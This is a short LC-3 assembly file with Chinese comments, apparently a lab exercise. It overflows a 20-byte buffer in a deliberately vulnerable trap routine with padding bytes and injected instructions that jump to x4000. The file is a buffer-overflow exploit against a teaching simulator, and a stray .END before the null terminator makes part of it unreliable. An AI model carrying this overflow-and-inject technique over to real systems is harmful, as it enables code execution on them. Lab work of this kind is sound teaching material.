.ORIG x3000           ; 用户程序起始地址

; ===== 主程序：触发漏洞攻击 =====
MAIN
    LEA R0, PAYLOAD   ; R0 指向攻击字符串（漏洞ISR的输入源）
    TRAP x30          ; 调用有漏洞的 ISR (TRAP x30)
    PUTSP
    HALT              

; ===== 攻击载荷 (PAYLOAD) =====
PAYLOAD
    ; --- 第一部分：填充20字节的提示符缓冲区 ---
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    .FILL x0041  ; 
    
    ;直接编写汇编代码
    ;如果通过PUTSP执行到此处，现在的pc等于x0340
    
    LD R0 ,ADDR
    JSRR R0
    ADDR .FILL x4000 
    .END
    ; --- 第三部分：字符串终止符 ---
    .FILL x0000  ; 必须的0，告诉strcpy停止复制
.END